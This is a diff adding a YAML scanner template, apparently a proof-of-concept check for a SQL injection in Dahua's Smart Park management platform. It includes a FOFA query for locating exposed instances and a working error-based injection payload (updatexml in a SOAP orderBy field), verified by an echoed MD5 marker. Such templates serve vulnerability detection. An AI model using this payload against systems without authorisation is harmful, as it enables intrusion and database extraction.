@@ -1,0 +1,53 @@
+id: poc-yaml-dahua-smart-park-getnewstaypointdetailquery-sqli
+info:
+  name: 大华智慧园区综合管理平台 getNewStaypointDetailQuery SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 大华智慧园区综合管理平台
+  fofa: app="dahua-智慧园区综合管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /portal/services/carQuery/getNewStaypointDetailQuery
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <car:getNewStaypointDetailQuery>
+
+    <!--type: string-->
+
+    <searchJson>{}</searchJson>
+
+    <!--type: string-->
+
+    <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)--"}</pageJson>
+
+    <!--type: string-->
+
+    <extend>quae divum incedo</extend>
+
+    </car:getNewStaypointDetailQuery>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  expression: 'status_code == 500 &&
+
+    contains(body,substr(t2,0,31)) &&
+
+    contains(body,"XPATH syntax error") &&
+
+    contains(content_type,"text/xml")
+
+    '
+transport: http
